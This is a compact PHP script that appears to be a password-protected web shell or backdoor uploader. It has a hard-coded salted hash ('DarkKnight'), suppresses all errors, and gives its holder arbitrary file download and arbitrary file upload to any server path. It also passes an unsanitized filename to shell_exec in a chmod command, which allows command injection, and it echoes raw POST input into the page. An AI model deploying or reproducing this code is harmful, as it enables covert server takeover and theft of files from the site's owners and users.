<?php
error_reporting(0);
function zhash(&$t)
{return md5($t.'DarkKnight').sha1('!'.md5('DarkKnight'.$t));}
$valid=(zhash($_POST['pass'])==
'49ae3611a0115b1fa682eca9d56359fd459719bd0d0df86d2e62d8bec79f23645d673363');
if($valid && $f=&$_REQUEST['get'])
{ 
	if(file_exists($f))
	{
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: "attachment"; filename="'.basename($f).'"');
		header('Content-Transfer-Encoding: binary');
		readfile($f);
		exit;
	}
}
?>
<style>
  body {
    color: #fff;
    background-color: #000;
  }

  textarea, input:not([type]), input[type="text"],input[type="password"] {
    font-size: 100%;
    color: #fff;
    border: 1px #ccc solid;
    background-color: #222;
    margin: 2px;
  }
</style>

<form enctype="multipart/form-data" action="upload.php" method="POST">
	<input name="pass" type="password" value="<?=$_POST['pass']?>">
	<input name="upload" type="file">
	<input type="submit" value="Upload"><br/>
	mv<input name="path" value="<?=$_POST['path']?>">
</form>
<form action="upload.php" method="POST">
	<input name="pass" type="password" value="<?=$_POST['pass']?>">
	<input name="get" size="50">
	<input type="submit" value="Get">
</form>
<?php
  printf("max: %s / %s\n", ini_get('post_max_size'), ini_get('upload_max_filesize'));
	if($valid && $file=&$_FILES['upload'])
	{
		echo '<pre>';
		$path=$_POST['path'];
    if(!$path)$path='';
		if(move_uploaded_file($file['tmp_name'],$path.$file['name']))
		{
			shell_exec('chmod o+r '.$file['name']);
			echo 'upload sucess('.$path.$file['name'].')'.chr(10);
			print_r($file);
		}
		else
			echo "upload failed\n";
		echo '</pre>';
	}
?>
